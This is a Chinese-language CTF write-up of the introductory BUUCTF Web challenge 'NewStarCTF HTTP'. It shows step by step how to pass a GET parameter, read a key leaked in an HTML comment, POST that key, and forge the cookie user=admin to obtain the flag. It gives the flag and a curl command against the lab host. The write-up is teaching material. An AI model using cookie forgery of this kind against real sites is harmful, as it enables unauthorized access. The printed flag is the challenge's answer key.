---
title: "[NewStarCTF 公开赛赛道]HTTP"
platform: BUUCTF
category: Web
difficulty: 入门
tags: [http-methods, cookie-manipulation, information-disclosure]
vulnerability: HTTP请求方法与Cookie伪造
solved: true
flag: "flag{a68ee036-171d-4745-843d-7f3de1ae6aeb}"
---

# [NewStarCTF 公开赛赛道]HTTP

## 题目概述
一道HTTP基础知识考察题，需要按照提示逐步构造正确的HTTP请求。

## 信息收集
1. 访问首页，提示：`Please GET me your name, I will tell you more things.`
2. 响应头设置Cookie：`user=guest`

## 漏洞分析
题目通过多步骤引导考察HTTP基础知识：
1. GET参数传递
2. HTML注释信息泄露
3. POST表单提交
4. Cookie伪造

## 利用过程

**Step 1**: 添加GET参数 `name`
```
GET /?name=test
响应: Hello,test. Please POST me the key Again.But Where is the key?
HTML注释: <!--Key: ctfisgood-->
```

**Step 2**: POST提交key参数
```
POST /?name=test
data: key=ctfisgood
响应: You are smart but you are not admin.
HTML注释: <!--Check something-->
```

**Step 3**: 修改Cookie为admin
```
POST /?name=test
Cookie: user=admin
data: key=ctfisgood
响应: flag{a68ee036-171d-4745-843d-7f3de1ae6aeb}
```

## 复现步骤
```bash
# 完整复现命令
curl -X POST "http://f169f712-0f59-4711-9691-dcaba2e17f36.node5.buuoj.cn:81/?name=test" \
  -d "key=ctfisgood" \
  -b "user=admin"
```

## 知识点
- HTTP GET/POST请求方法
- HTML注释可能泄露敏感信息
- Cookie可以客户端修改伪造身份
